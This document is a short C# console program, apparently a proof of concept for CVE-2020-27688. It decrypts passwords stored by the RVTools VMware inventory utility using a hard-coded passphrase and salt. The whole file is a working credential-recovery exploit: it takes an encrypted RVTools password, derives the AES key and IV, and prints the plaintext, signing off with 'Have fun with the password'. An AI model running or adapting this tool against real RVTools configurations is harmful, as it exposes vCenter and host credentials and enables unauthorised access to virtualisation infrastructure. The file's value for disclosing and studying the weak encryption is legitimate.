using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RVToolDecryptor
{
    class Decyptor
    {
        static void Main()
        {

            Console.WriteLine("+-----------------------------------+");
            Console.WriteLine("|        RVTools Decryptor          |");
            Console.WriteLine("|        By: Matthias Maes          |");
            Console.WriteLine("|          CVE-2020-27688           |");
            Console.WriteLine("+-----------------------------------+");
            Console.WriteLine();
            Console.WriteLine();

            Console.Write("RVTools encrypted password> ");
            string cipherText = Console.ReadLine();

            try
            {


                cipherText = cipherText.Replace("_RVToolsPWD", "");
                cipherText = cipherText.Replace(" ", "+");
                byte[] buffer = Convert.FromBase64String(cipherText);
                using (Aes aes = Aes.Create())
                {
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("robware", new byte[13]
                    {
                        (byte) 73,
                        (byte) 118,
                        (byte) 97,
                        (byte) 110,
                        (byte) 32,
                        (byte) 77,
                        (byte) 101,
                        (byte) 100,
                        (byte) 118,
                        (byte) 101,
                        (byte) 100,
                        (byte) 101,
                        (byte) 118
                    });
                    ((SymmetricAlgorithm)aes).Key = rfc2898DeriveBytes.GetBytes(32);
                    ((SymmetricAlgorithm)aes).IV = rfc2898DeriveBytes.GetBytes(16);
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, ((SymmetricAlgorithm)aes).CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(buffer, 0, buffer.Length);
                            cryptoStream.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(memoryStream.ToArray());
                    }
                }
                Console.WriteLine("RVTools decrypted password> " + cipherText);
                Console.WriteLine();
                Console.WriteLine("Have fun with the password, bye bye :)");
            }
            catch (Exception)
            {

                Console.WriteLine("Well, this is akward. Incorrect encrypted password :-(");
                Console.WriteLine("Try again!");
            }
        }
    }
}
